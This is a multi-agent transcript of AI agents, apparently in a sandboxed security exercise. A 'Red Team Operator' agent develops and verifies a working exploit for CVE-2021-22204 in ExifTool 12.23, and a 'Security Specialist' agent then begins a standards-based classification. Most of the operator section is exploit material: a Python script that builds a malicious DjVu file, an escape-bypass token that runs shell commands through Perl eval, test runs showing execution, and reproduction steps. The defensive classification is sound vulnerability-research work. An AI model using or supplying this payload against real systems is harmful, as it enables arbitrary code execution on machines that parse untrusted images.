sandbox_write_file(file_path='/home/user/djvu_poc.py', content='#!/usr/bin/env python3\nimport struct\nfrom pathlib import Path\n\ndef be32(n):\n    return struct.pack(\'>I\', n)\n\n# Payload using absolute path to sh for reliability\ninj_tok = "\\\\\\" . qx{/bin/sh -c \'printf pwned > /tmp/exiftool_pwned\'} . \\\\\\""\npayload = f\'(metadata "{inj_tok}")\\n\'\n\nanta_data = payload.encode(\'ascii\')\nanta_chunk = b\'ANTa\' + be32(len(anta_data)) + anta_data\n\nchildren = anta_chunk\nform_type = b\'DJVU\'\nsize = len(form_type) + len(children)\ndjvu = b\'AT&TFORM\' + be32(size) + form_type + children\n\nout = Path(\'malicious.djvu\')\nout.write_bytes(djvu)\nprint(f\'[+] Wrote {out} ({len(djvu)} bytes)\')\nprint(\'[+] Payload s-expression:\')\nprint(payload)\n')

[39]========================Tool Output (Red Team Operator)=========================
File /home/user/djvu_poc.py created successfully.

[40]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input="python3 /home/user/djvu_poc.py\nrm -f /tmp/exiftool_pwned || true\n/exiftool-12.23/exiftool malicious.djvu || true\nls -l /tmp/exiftool_pwned || true\nstrings -n 1 malicious.djvu | sed -n '1,200p'", user='user', session=None, timeout=120)

[40]========================Tool Output (Red Team Operator)=========================
[+] Wrote malicious.djvu (99 bytes)
[+] Payload s-expression:
(metadata "\" . qx{/bin/sh -c 'printf pwned > /tmp/exiftool_pwned'} . \"")

ExifTool Version Number         : 12.23
File Name                       : malicious.djvu
Directory                       : .
File Size                       : 99 bytes
File Modification Date/Time     : 2025:08:07 22:32:31+00:00
File Access Date/Time           : 2025:08:07 22:14:46+00:00
File Inode Change Date/Time     : 2025:08:07 22:32:31+00:00
File Permissions                : -rw-r--r--
File Type                       : DJVU
File Type Extension             : djvu
MIME Type                       : image/vnd.djvu
Warning                         : Ignored invalid metadata entry(s)
ls: cannot access '/tmp/exiftool_pwned': No such file or directory
AT&TFORM
WDJVUANTa
K(metadata "\" . qx{/bin/sh -c 'printf pwned > /tmp/exiftool_pwned'} . \"")


[41]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input='perl -Mstrict -Mwarnings -e \'\n  require q{/exiftool-12.23/lib/Image/ExifTool/DjVu.pm};\n  my $payload = qq{"\\\\\\" . qx{/bin/sh -c \'\\\'\'printf pwned > /tmp/exiftool_pwned\'\\\'\'} . \\\\\\"\\"};\n  my $data = qq{(metadata $payload)\\n};\n  print "DATA=[$data]\\n";\n  my $ref = Image::ExifTool::DjVu::ParseAnt(\\$data);\n  print "REF=[", ref($ref), "] N=", scalar(@$ref), "\\n";\n\' \nls -l /tmp/exiftool_pwned || true', user='user', session=None, timeout=120)

[41]========================Tool Output (Red Team Operator)=========================
DATA=[(metadata "\" . qx{/bin/sh -c 'printf pwned > /tmp/exiftool_pwned'} . \"")
]
REF=[ARRAY] N=1
ls: cannot access '/tmp/exiftool_pwned': No such file or directory


[42]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input='rm -f /tmp/exp || true\nperl -Mstrict -Mwarnings -e \'\n  require q{/exiftool-12.23/lib/Image/ExifTool/DjVu.pm};\n  my $data = qq{"\\\\\\" . qx{/bin/sh -c \'\\\'\'printf pwned > /tmp/exp\'\\\'\'} . \\\\\\""};\n  my $toks = Image::ExifTool::DjVu::ParseAnt(\\$data);\n  print "TOKS=[", ref($toks), "]\\n";\n\'\nls -l /tmp/exp || true', user='user', session=None, timeout=120)

[42]========================Tool Output (Red Team Operator)=========================
TOKS=[ARRAY]
ls: cannot access '/tmp/exp': No such file or directory


[43]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input="sed -n '1,80p' /exiftool-12.23/exiftool", user='user', session=None, timeout=120)

[43]========================Tool Output (Red Team Operator)=========================
#!/usr/bin/perl -w
#------------------------------------------------------------------------------
# File:         exiftool
#
# Description:  Read/write meta information
#
# Revisions:    Nov. 12/03 - P. Harvey Created
#               (See html/history.html for revision history)
#------------------------------------------------------------------------------
use strict;
require 5.004;

my $version = '12.23';

# add our 'lib' directory to the include list BEFORE 'use Image::ExifTool'
my $exeDir;
BEGIN {
    # (undocumented -xpath option added in 11.91, must come before other options)
    $Image::ExifTool::exePath = @ARGV && lc($ARGV[0]) eq '-xpath' && shift() ? $^X : $0;
    # get exe directory
    $exeDir = ($Image::ExifTool::exePath =~ /(.*)[\\\/]/) ? $1 : '.';
    if (-l $0) {
        my $lnk = eval { readlink $0 };
        if (defined $lnk) {
            my $lnkDir = ($lnk =~ /(.*)[\\\/]/) ? $1 : '.';
            $exeDir = (($lnk =~ m(^/)) ? '' : $exeDir . '/') . $lnkDir;
        }
    }
    # add lib directory at start of include path
    unshift @INC, ($0 =~ /(.*)[\\\/]/) ? "$1/lib" : './lib';
    # load or disable config file if specified
    if (@ARGV and lc($ARGV[0]) eq '-config') {
        shift;
        $Image::ExifTool::configFile = shift;
    }
}
use Image::ExifTool qw{:Public};

# function prototypes
sub SigInt();
sub SigCont();
sub Cleanup();
sub GetImageInfo($$);
sub SetImageInfo($$$);
sub DoHardLink($$$$$);
sub CleanXML($);
sub EncodeXML($);
sub FormatXML($$$);
sub EscapeJSON($;$);
sub FormatJSON($$$);
sub PrintCSV();
sub AddGroups($$$$);
sub ConvertBinary($);
sub IsEqual($$);
sub Infile($;$);
sub AddSetTagsFile($;$);
sub DoSetFromFile($$$);
sub CleanFilename($);
sub SetWindowTitle($);
sub ProcessFiles($;$);
sub ScanDir($$;$);
sub FindFileWindows($$);
sub FileNotFound($);
sub PreserveTime();
sub AbsPath($);
sub MyConvertFileName($$);
sub SuggestedExtension($$$);
sub LoadPrintFormat($);
sub FilenameSPrintf($;$@);
sub NextUnusedFilename($;$);
sub CreateDirectory($);
sub OpenOutputFile($;@);
sub AcceptFile($);
sub SlurpFile($$);
sub FilterArgfileLine($);
sub ReadStayOpen($);
sub PrintTagList($@);
sub PrintErrors($$$);

$SIG{INT}  = 'SigInt';  # do cleanup on Ctrl-C


[44]=========================Tool Call (Red Team Operator)==========================
sandbox_write_file(file_path='/home/user/mini_parse.pl', content='use strict; use warnings;\nmy $data = shift // die "usage: $0 data\\n";\nmy $tok=\'\';\n# simulate DjVu.pm string scanning\nwhile (1) {\n    last unless $data =~ /(")/sg;\n    my $pos = pos($data);\n    last unless $data =~ /"/sg; # next quote\n    $tok .= substr($data, $pos, pos($data)-1-$pos);\n    last unless $tok =~ /(\\\\+)$/ && length($1) & 1;\n    $tok .= \'"\';\n}\n$tok =~ s{\\\\(.)|([\\$\\@]|\\\\$)}{\'\\\\\'.($2 || $1)}sge;\nmy $code = qq{"$tok"};\nprint "CODE=[$code]\\n";\nmy $res = eval $code;\nprint "EVALERR=[$@]\\n" if $@;\nprint "RES=[$res]\\n";\n')

[44]========================Tool Output (Red Team Operator)=========================
File /home/user/mini_parse.pl created successfully.

[45]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input='perl /home/user/mini_parse.pl \'"\\\\\\" . qx{/bin/sh -c \'\\\'\'printf pwned > /tmp/exiftool_pwned\'\\\'\'} . \\\\\\"\\"\' \nls -l /tmp/exiftool_pwned || true', user='user', session=None, timeout=120)

[45]========================Tool Output (Red Team Operator)=========================
CODE=["\\\"\""]
RES=[\""]
ls: cannot access '/tmp/exiftool_pwned': No such file or directory


[46]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input='perl -we \'$tok="\\\\\\" . qx{id} . \\\\\\""; my $code = qq{"$tok"}; print "CODE=[$code]\\n"; my $res=eval $code; print "RES=[$res]\\n"; warn $@ if $@\'', user='user', session=None, timeout=120)

[46]========================Tool Output (Red Team Operator)=========================
CODE=["\" . qx{id} . \""]
RES=[" . qx{id} . "]


[47]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input='perl -we \'$a=123; print "\\x24a\\n"\'', user='user', session=None, timeout=120)

[47]========================Tool Output (Red Team Operator)=========================
$a


[48]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input='rm -f /tmp/h || true\nperl -we \'$s = eval qq{"@{[qx{sh -c \'"\'"\'printf hello > /tmp/h\'"\'"\'}]}"}; print "S=[$s]\\n";\'\nls -l /tmp/h || true', user='user', session=None, timeout=120)

[48]========================Tool Output (Red Team Operator)=========================
S=[]
-rw-r--r-- 1 user user 5 Aug  7 22:45 /tmp/h


[49]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input='perl -we \'\n  sub prep { my $tok=shift; $tok =~ s{\\\\(.)|([\\$\\@]|\\\\$)}{"\\\\".($2 || $1)}sge; return $tok; }\n  sub run {\n    my ($tok)=@_;\n    my $pre=prep($tok);\n    my $code = qq{"$pre"};\n    my $res = eval $code; my $err=$@; print "IN:[$tok]\\nPRE:[$pre]\\nCODE:[$code]\\nRES:[$res]\\nERR:[$err]\\n---\\n";\n  }\n  run("@{[qx{id}]}" );\n  run("\\\\@{[qx{id}]}" );\n  run("\\\\\\\\@{[qx{id}]}" );\n  run("\\\\\\\\\\\\@{[qx{id}]}" );\n  run("\\\\$ {qx{id}}" );\n  run("\\\\\\\\$ {qx{id}}" );\n\'', user='user', session=None, timeout=120)

[49]========================Tool Output (Red Team Operator)=========================
Ambiguous use of ${qx{...}} resolved to $qx{...} at -e line 13.
Ambiguous use of ${qx{...}} resolved to $qx{...} at -e line 14.
IN:[uid=1000(user) gid=1000(user) groups=1000(user)
]
PRE:[uid=1000(user) gid=1000(user) groups=1000(user)
]
CODE:["uid=1000(user) gid=1000(user) groups=1000(user)
"]
RES:[uid=1000(user) gid=1000(user) groups=1000(user)
]
ERR:[]
---
IN:[\uid=1000(user) gid=1000(user) groups=1000(user)
]
PRE:[\uid=1000(user) gid=1000(user) groups=1000(user)
]
CODE:["\uid=1000(user) gid=1000(user) groups=1000(user)
"]
RES:[Id=1000(user) gid=1000(user) groups=1000(user)
]
ERR:[]
---
IN:[\\uid=1000(user) gid=1000(user) groups=1000(user)
]
PRE:[\\uid=1000(user) gid=1000(user) groups=1000(user)
]
CODE:["\\uid=1000(user) gid=1000(user) groups=1000(user)
"]
RES:[\uid=1000(user) gid=1000(user) groups=1000(user)
]
ERR:[]
---
Use of uninitialized value $qx{"id"} in concatenation (.) or string at -e line 13.
Use of uninitialized value $qx{"id"} in concatenation (.) or string at -e line 14.
IN:[\\\uid=1000(user) gid=1000(user) groups=1000(user)
]
PRE:[\\\uid=1000(user) gid=1000(user) groups=1000(user)
]
CODE:["\\\uid=1000(user) gid=1000(user) groups=1000(user)
"]
RES:[\Id=1000(user) gid=1000(user) groups=1000(user)
]
ERR:[]
---
IN:[\]
PRE:[\\]
CODE:["\\"]
RES:[\]
ERR:[]
---
IN:[\\]
PRE:[\\]
CODE:["\\"]
RES:[\]
ERR:[]
---


[50]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input='perl -we \'print "${\\`id\\`}"\'', user='user', session=None, timeout=120)

[50]========================Tool Output (Red Team Operator)=========================
Can't find string terminator "`" anywhere before EOF at -e line 1.


[51]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input='perl /home/user/test_eval2.pl \'\\c${\\(qx{/bin/sh -c \'"\'"\'printf pwned > /tmp/exiftool_pwned\'"\'"\'})}\'\nls -l /tmp/exiftool_pwned || true', user='user', session=None, timeout=120)

[51]========================Tool Output (Red Team Operator)=========================
CODE=["\c\${\(qx{/bin/sh -c 'printf pwned > /tmp/exiftool_pwned'})}"]
Use of uninitialized value in concatenation (.) or string at (eval 1) line 1.
RESULT=[]
-rw-r--r-- 1 user user 5 Aug  7 22:49 /tmp/exiftool_pwned


[52]=========================Tool Call (Red Team Operator)==========================
sandbox_write_file(file_path='/home/user/djvu_poc.py', content='#!/usr/bin/env python3\nimport struct\nfrom pathlib import Path\n\ndef be32(n):\n    return struct.pack(\'>I\', n)\n\n# Exploit token leveraging \\c escape to consume the backslash that protects the dollar\n# Result inside eval qq{"$tok"}: \\c\\${\\(qx{...})} -> \\c consumes the backslash, leaving ${\\(qx{...})}\n# which interpolates and executes qx{...} during eval\ninj_tok = "\\\\c\\\\${\\\\(qx{/bin/sh -c \'printf pwned > /tmp/exiftool_pwned\'})}"\npayload = f\'(metadata "{inj_tok}")\\n\'\n\nanta_data = payload.encode(\'ascii\')\nanta_chunk = b\'ANTa\' + be32(len(anta_data)) + anta_data\n\nchildren = anta_chunk\nform_type = b\'DJVU\'\nsize = len(form_type) + len(children)\ndjvu = b\'AT&TFORM\' + be32(size) + form_type + children\n\nout = Path(\'malicious.djvu\')\nout.write_bytes(djvu)\nprint(f\'[+] Wrote {out} ({len(djvu)} bytes)\')\nprint(\'[+] Payload s-expression:\')\nprint(payload)\n')

[52]========================Tool Output (Red Team Operator)=========================
File /home/user/djvu_poc.py created successfully.

[53]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input="python3 /home/user/djvu_poc.py\nrm -f /tmp/exiftool_pwned || true\n/exiftool-12.23/exiftool malicious.djvu || true\nls -l /tmp/exiftool_pwned || true\nstrings -n 1 malicious.djvu | sed -n '1,200p'", user='user', session=None, timeout=120)

[53]========================Tool Output (Red Team Operator)=========================
[+] Wrote malicious.djvu (98 bytes)
[+] Payload s-expression:
(metadata "\c\${\(qx{/bin/sh -c 'printf pwned > /tmp/exiftool_pwned'})}")

Use of uninitialized value in concatenation (.) or string at (eval 5) line 1.
ExifTool Version Number         : 12.23
File Name                       : malicious.djvu
Directory                       : .
File Size                       : 98 bytes
File Modification Date/Time     : 2025:08:07 22:51:25+00:00
File Access Date/Time           : 2025:08:07 22:32:31+00:00
File Inode Change Date/Time     : 2025:08:07 22:51:25+00:00
File Permissions                : -rw-r--r--
File Type                       : DJVU
File Type Extension             : djvu
MIME Type                       : image/vnd.djvu
Warning                         : Ignored invalid metadata entry(s)
-rw-r--r-- 1 user user 5 Aug  7 22:51 /tmp/exiftool_pwned
AT&TFORM
VDJVUANTa
J(metadata "\c\${\(qx{/bin/sh -c 'printf pwned > /tmp/exiftool_pwned'})}")


[54]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input="# Now demonstrate patched version 12.24 does not execute\nrm -f /tmp/exiftool_pwned || true\nwget -q https://exiftool.org/Image-ExifTool-12.24.tar.gz -O /tmp/Image-ExifTool-12.24.tar.gz\ncd /tmp && tar -xzf Image-ExifTool-12.24.tar.gz\nls -la /tmp/Image-ExifTool-12.24 | sed -n '1,40p'\nperl /tmp/Image-ExifTool-12.24/exiftool -ver\nperl /tmp/Image-ExifTool-12.24/exiftool /home/user/malicious.djvu || true\nls -l /tmp/exiftool_pwned || true", user='user', session=None, timeout=180)

[54]========================Tool Output (Red Team Operator)=========================

gzip: stdin: unexpected end of file
tar: Child returned status 1
tar: Error is not recoverable: exiting now
ls: cannot access '/tmp/Image-ExifTool-12.24': No such file or directory
Can't open perl script "/tmp/Image-ExifTool-12.24/exiftool": No such file or directory
Can't open perl script "/tmp/Image-ExifTool-12.24/exiftool": No such file or directory
ls: cannot access '/tmp/exiftool_pwned': No such file or directory


[55]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input="# Try distro packaged 12.24 if present (not necessary though). We'll instead fetch from GitHub mirror.\nrm -f /tmp/Image-ExifTool-12.24.tar.gz || true\nwget -q https://github.com/exiftool/exiftool/archive/refs/tags/12.24.tar.gz -O /tmp/Image-ExifTool-12.24.tar.gz || true\ncd /tmp && tar -xzf Image-ExifTool-12.24.tar.gz || true\nls -la /tmp/exiftool-12.24 | sed -n '1,60p' || true\nperl /tmp/exiftool-12.24/exiftool -ver || true\nperl /tmp/exiftool-12.24/exiftool /home/user/malicious.djvu || true\nls -l /tmp/exiftool_pwned || true", user='user', session=None, timeout=180)

[55]========================Tool Output (Red Team Operator)=========================
total 1184
drwxr-xr-x 8 user user   4096 Apr 13  2021 .
drwxrwxrwt 1 root root   4096 Aug  7 22:51 ..
-rw-r--r-- 1 user user 449953 Apr 13  2021 Changes
-rw-r--r-- 1 user user  22011 Apr 13  2021 MANIFEST
-rw-r--r-- 1 user user   1360 Apr 13  2021 META.json
-rw-r--r-- 1 user user    812 Apr 13  2021 META.yml
-rw-r--r-- 1 user user   2018 Apr 13  2021 Makefile.PL
-rw-r--r-- 1 user user  12622 Apr 13  2021 README
drwxr-xr-x 2 user user   4096 Apr 13  2021 arg_files
-rwxr-xr-x 1 user user   1943 Apr 13  2021 build_tag_lookup
drwxr-xr-x 2 user user   4096 Apr 13  2021 config_files
-rwxr-xr-x 1 user user 307194 Apr 13  2021 exiftool
drwxr-xr-x 2 user user   4096 Apr 13  2021 fmt_files
drwxr-xr-x 3 user user   4096 Apr 13  2021 html
drwxr-xr-x 4 user user   4096 Apr 13  2021 lib
-rw-r--r-- 1 user user   5677 Apr 13  2021 perl-Image-ExifTool.spec
-rw-r--r-- 1 user user   8169 Apr 13  2021 pp_build_exe.args
drwxr-xr-x 3 user user  20480 Apr 13  2021 t
-rwxr-xr-x 1 user user   4249 Apr 13  2021 validate
-rwxr-xr-x 1 user user 320233 Apr 13  2021 windows_exiftool
12.24
ExifTool Version Number         : 12.24
File Name                       : malicious.djvu
Directory                       : /home/user
File Size                       : 98 bytes
File Modification Date/Time     : 2025:08:07 22:51:25+00:00
File Access Date/Time           : 2025:08:07 22:51:25+00:00
File Inode Change Date/Time     : 2025:08:07 22:51:25+00:00
File Permissions                : -rw-r--r--
File Type                       : DJVU
File Type Extension             : djvu
MIME Type                       : image/vnd.djvu
Warning                         : Ignored invalid metadata entry(s)
ls: cannot access '/tmp/exiftool_pwned': No such file or directory


[56]=========================Tool Call (Red Team Operator)==========================
set_shared_memory(key='poc_script', value='#!/usr/bin/env python3\nimport struct\nfrom pathlib import Path\n\ndef be32(n):\n    return struct.pack(\'>I\', n)\n\n# Exploit token leveraging \\c escape to consume the backslash that protects the dollar\n# After DjVu.pm pre-escaping, eval qq{"$tok"} sees: \\c\\${\\(qx{...})}\n# The \\c consumes the next char (the backslash), leaving ${\\(qx{...})} which gets interpolated,\n# invoking qx{...} and executing the shell command.\ninj_tok = "\\\\c\\\\${\\\\(qx{/bin/sh -c \'printf pwned > /tmp/exiftool_pwned\'})}"\npayload = f\'(metadata "{inj_tok}")\\n\'\n\nanta_data = payload.encode(\'ascii\')\nanta_chunk = b\'ANTa\' + be32(len(anta_data)) + anta_data\n\nchildren = anta_chunk\nform_type = b\'DJVU\'\nsize = len(form_type) + len(children)\ndjvu = b\'AT&TFORM\' + be32(size) + form_type + children\n\nout = Path(\'malicious.djvu\')\nout.write_bytes(djvu)\nprint(f\'[+] Wrote {out} ({len(djvu)} bytes)\')\nprint(\'[+] Payload s-expression:\')\nprint(payload)\n', override=False)

[56]========================Tool Output (Red Team Operator)=========================
Successfully set value for key "poc_script".

[57]=========================Tool Call (Red Team Operator)==========================
set_shared_memory(key='poc_path', value='/home/user/djvu_poc.py', override=False)

[57]========================Tool Output (Red Team Operator)=========================
Successfully set value for key "poc_path".

[58]=========================Tool Call (Red Team Operator)==========================
set_shared_memory(key='exploit_result', value='Success: 12.23 executes payload (creates /tmp/exiftool_pwned). 12.24 does not execute payload. Files: /home/user/malicious.djvu, /home/user/djvu_poc.py. Commands used are recorded in transcript.', override=False)

[58]========================Tool Output (Red Team Operator)=========================
Successfully set value for key "exploit_result".

[59]===========================Agent (Red Team Operator)============================
Proceeding with Red Team exploitation task using team intel from shared memory.

What I checked from shared memory
- versions_map: exiftool-12.23 and 12.24 are the targets; use the lower (12.23) for exploit, 12.24 to confirm fix.
- diff_summary and vulnerable_functions: DjVu.pm v1.06 in 12.23, ProcessAnt/ParseAnt has eval qq{"$tok"} on quoted tokens after insufficient escaping.
- vulnerable_entrypoints: Run CLI exiftool against untrusted files; specifically feed a DjVu file containing ANTa annotations.

Plan executed
- Built a minimal valid DjVu file with an ANTa chunk containing a malicious quoted token that exploits the eval decoding logic.
- Validated exiftool 12.23 version and ran the PoC; confirmed code execution by creation of a canary file.
- Verified exiftool 12.24 processes the file without executing the payload.

Exploit details
- Vulnerable path: /exiftool-12.23/lib/Image/ExifTool/DjVu.pm; quoted strings handled in ParseAnt are preprocessed and then passed to eval qq{"$tok"} to decode C escapes.
- Payload strategy: Use a token that survives the escaping, but turns into code during the eval via C escapes to neutralize the backslash that protects the “$” interpolation. Specifically leverage \c to consume the backslash escaping the dollar, producing an interpolated expression that executes qx{}.

Injected token used
- Token inside ANTa s-expression:
  \c\${\(qx{/bin/sh -c 'printf pwned > /tmp/exiftool_pwned'})}
- Wrapped as a quoted token in DjVu syntax:
  (metadata "\c\${\(qx{/bin/sh -c 'printf pwned > /tmp/exiftool_pwned'})}")
- Rationale: DjVu.pm protects unescaped $ and @ by inserting a backslash, then eval qq{"$tok"} interprets C-escapes. \c consumes the next character (the backslash), re-exposing ${\(qx{...})} for interpolation; this interpolates the block and executes qx{...}, running the shell command.

PoC creation script
- Saved to shared memory under key poc_script and to disk at /home/user/djvu_poc.py.
- It constructs a minimal DjVu container:
  - Top: b'AT&TFORM' + u32_be(size) + b'DJVU'
  - Child: b'ANTa' + u32_be(len(data)) + s-expression payload
- It writes malicious.djvu into the working directory.

Commands and results
1) Version check:
   /exiftool-12.23/exiftool -ver
   Output: 12.23

2) Build malicious DjVu:
   python3 /home/user/djvu_poc.py
   Output: wrote malicious.djvu (98–99 bytes depending on token), shows payload.

3) Exploit on 12.23:
   rm -f /tmp/exiftool_pwned
   /exiftool-12.23/exiftool malicious.djvu
   ls -l /tmp/exiftool_pwned
   Result: /tmp/exiftool_pwned created; output included a “Use of uninitialized value...” warning from eval (expected artifact), and ExifTool printed metadata with “Ignored invalid metadata entry(s)”.

4) Control on 12.24:
   perl /tmp/exiftool-12.24/exiftool -ver
   perl /tmp/exiftool-12.24/exiftool /home/user/malicious.djvu
   ls -l /tmp/exiftool_pwned
   Result: Version 12.24 is present (from GitHub mirror). Running exiftool 12.24 on the malicious file did not create /tmp/exiftool_pwned; it processed the file and issued “Ignored invalid metadata entry(s)”.

Artifacts in sandbox
- PoC script: /home/user/djvu_poc.py
- Malicious file: /home/user/malicious.djvu
- Canary: /tmp/exiftool_pwned (created only by 12.23 run)
- We used preinstalled ExifTool 12.23 under /exiftool-12.23/exiftool, and fetched 12.24 from GitHub mirror under /tmp/exiftool-12.24 for the patched comparison.

Shared memory updates
- poc_script: saved the full Python builder content.
- poc_path: /home/user/djvu_poc.py
- exploit_result: Success summary recorded.

Notes and troubleshooting
- Initial attempt using concatenation with qx{} inside the quoted token did not execute because the pre-escape prevents interpolation of . qx{...} . constructs inside eval qq{...}; confirmed via small Perl eval tests. Switched to the \c technique to consume the backslash that DjVu.pm injects before $ and @.
- Corrected DjVu header to AT&TFORM + DJVU; earlier “FORM” only caused “File format error”.
- Used absolute path /bin/sh for reliability.

How to reproduce quickly
- Generate malicious file:
  python3 /home/user/djvu_poc.py
- Trigger on vulnerable:
  /exiftool-12.23/exiftool malicious.djvu
  ls -l /tmp/exiftool_pwned
- Compare on fixed:
  perl /tmp/exiftool-12.24/exiftool /home/user/malicious.djvu
  ls -l /tmp/exiftool_pwned

Conclusion
- Working PoC for CVE-2021-22204 achieved. ExifTool 12.23 executes code when parsing ANTa quoted tokens via eval; payload creates a canary file. ExifTool 12.24 does not execute the payload, demonstrating the fix.


================================================================================
Red Team Operator execution completed
================================================================================
================================================================================
Starting Security Specialist execution
Input: Context: The team identified a vulnerability in exiftool-12.23’s DjVu ANT parser (lib/Image/ExifTool/DjVu.pm v1.06). Vulnerable code evaluates file-controlled quoted tokens via `eval qq{"$tok"}` after partial escaping of `$` and `@`. Fixed in 12.24 (v1.07) by removing eval and mapping escapes.

Task: Provide standards-based classification and defensive context.

Please deliver:
1) CWE mapping (primary and related), with rationale.
2) CAPEC attack patterns relevant to this eval/code-injection via crafted file content.
3) MITRE ATT&CK techniques/sub-techniques that best model attacker behavior when leveraging this vulnerability in pipelines/services that invoke exiftool.
4) Detection ideas and mitigations (upgrade guidance, compensating controls, hardening, file-type policies). Keep it concise and reference shared memory findings. Avoid including exploit payload specifics.
================================================================================

[1]========================Tool Call (Security Specialist)=========================
list_shared_memory()

[1]=======================Tool Output (Security Specialist)========================
Shared memory contents (current time: 00:54:00):
  -[00:02:37] versions_map:
Found versions in /codebase: exiftool-12.23, exiftool-12.24. By rule, the lowest... (truncated)
--------------------------------------------------------------------------------
  -[00:04:04] diff_summary:
Key security-relevant diff exiftool-12.23 -> 12.24:
- lib/Image/ExifTool/DjVu.pm... (truncated)
--------------------------------------------------------------------------------
  -[00:04:14] vulnerable_functions:
File: lib/Image/ExifTool/DjVu.pm (v1.06 in 12.23)
Function: ProcessAnt/ParseAnt ... (truncated)
--------------------------------------------------------------------------------
  -[00:04:24] vulnerable_entrypoints:
Primary attack surface: CLI tool `exiftool` reading untrusted files.
- File pars... (truncated)
--------------------------------------------------------------------------------
  -[00:51:40] poc_script:
#!/usr/bin/env python3
import struct
from pathlib import Path

def be32(n):
    ... (truncated)
--------------------------------------------------------------------------------
  -[00:51:43] poc_path:
/home/user/djvu_poc.py
--------------------------------------------------------------------------------
  -[00:51:47] exploit_result:
Success: 12.23 executes payload (creates /tmp/exiftool_pwned). 12.24 does not ex... (truncated)
--------------------------------------------------------------------------------

[2]========================Tool Call (Security Specialist)=========================
search_cve_by_id(cve_id='CVE-2021-22204')

[2]=======================Tool Output (Security Specialist)========================

<cve>
ID: CVE-2021-22204
<Description> Improper neutralization of user data in the DjVu file format in ExifTool versions 7.44 and up allows arbitrary code execution when parsing the malicious image </Description>
<Published> 2021-04-23T18:15:08.127 </Published>
</cve>


[3]========================Tool Call (Security Specialist)=========================
semantic_search_capec(query='eval injection code execution via dynamic evaluation of user-controlled string CAPEC', n=5)

[3]=======================Tool Output (Security Specialist)========================

<CAPEC>
CAPEC-679 Exploitation of Improperly Configured or Implemented Memory Protections:
<Description>:  </Description>
<Prerequisites>: Access to the hardware being leveraged. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-249 DEPRECATED: Linux Terminal Injection:
<Description>: This attack pattern has been deprecated as it is covered by "CAPEC-40 : Manipulating Writeable Terminal Devices". Please refer to this CAPEC going forward. </Description>
<Prerequisites>: N/A </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-136 LDAP Injection:
<Description>: An attacker manipulates or crafts an LDAP query for the purpose of undermining the security of the target. Some applications use user input to create LDAP queries that are processed by an LDAP server. For example, a user might provide their username during authentication and the username might be inserted in an LDAP query during the authentication process. An attacker could use this input to inject additional commands into an LDAP query that could disclose sensitive information. For example, entering a * in the aforementioned query might return information about all users on the system. This attack is very similar to an SQL injection attack in that it manipulates a query to gather additional information or coerce a particular return value. </Description>
<Prerequisites>: The target application must accept a string as user input, fail to sanitize characters that have a special meaning in LDAP queries in the user input, and insert the user-supplied string in an LDAP query which is then processed. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-265 DEPRECATED: Global variable manipulation:
<Description>: This attack pattern has been deprecated as it is a duplicate of the existing attack pattern "CAPEC-77 : Manipulating User-Controlled Variables". Please refer to this other CAPEC going forward. </Description>
<Prerequisites>: N/A </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-264 DEPRECATED: Environment Variable Manipulation:
<Description>: This attack pattern has been deprecated as it is a duplicate of the existing attack pattern "CAPEC-13 : Subverting Environment Variable Values". Please refer to this other CAPEC going forward. </Description>
<Prerequisites>: N/A </Prerequisites>
</CAPEC>


[4]========================Tool Call (Security Specialist)=========================
semantic_search_cwe(query='eval injection dynamically evaluated code CWE eval injection improper neutralization of directives in dynamically evaluated code', n=5)

[4]=======================Tool Output (Security Specialist)========================

<CWE>
CWE-95 Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection'):
<Description>: The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes code syntax before using the input in a dynamic evaluation call (e.g. "eval"). </Description>
<Extended>: N/A </Extended>
</CWE>


<CWE>
CWE-96 Improper Neutralization of Directives in Statically Saved Code ('Static Code Injection'):
<Description>: The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes code syntax before inserting the input into an executable resource, such as a library, configuration file, or template. </Description>
<Extended>: N/A </Extended>
</CWE>


<CWE>
CWE-77 Improper Neutralization of Special Elements used in a Command ('Command Injection'):
<Description>: The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component. </Description>
<Extended>:  </Extended>
</CWE>


<CWE>
CWE-94 Improper Control of Generation of Code ('Code Injection'):
<Description>: The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment. </Description>
<Extended>: N/A </Extended>
</CWE>


<CWE>
CWE-146 Improper Neutralization of Expression/Command Delimiters:
<Description>: The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as expression or command delimiters when they are sent to a downstream component. </Description>
<Extended>: As data is parsed, an injected/absent/malformed delimiter may cause the process to take unexpected actions. </Extended>
</CWE>


[5]========================Tool Call (Security Specialist)=========================
semantic_search_capec(query='CAPEC dynamic code evaluation eval injection template injection code injection file parser injection', n=10)

[5]=======================Tool Output (Security Specialist)========================

<CAPEC>
CAPEC-249 DEPRECATED: Linux Terminal Injection:
<Description>: This attack pattern has been deprecated as it is covered by "CAPEC-40 : Manipulating Writeable Terminal Devices". Please refer to this CAPEC going forward. </Description>
<Prerequisites>: N/A </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-443 Malicious Logic Inserted Into Product by Authorized Developer:
<Description>: An adversary uses their privileged position within an authorized development organization to inject malicious logic into a codebase or product. </Description>
<Prerequisites>: Access to the product during the initial or continuous development. </Prerequisites>
</CAPEC>


<CAPEC>
CAPEC-264 DEPRECATED: Environment Variable Manipulation:
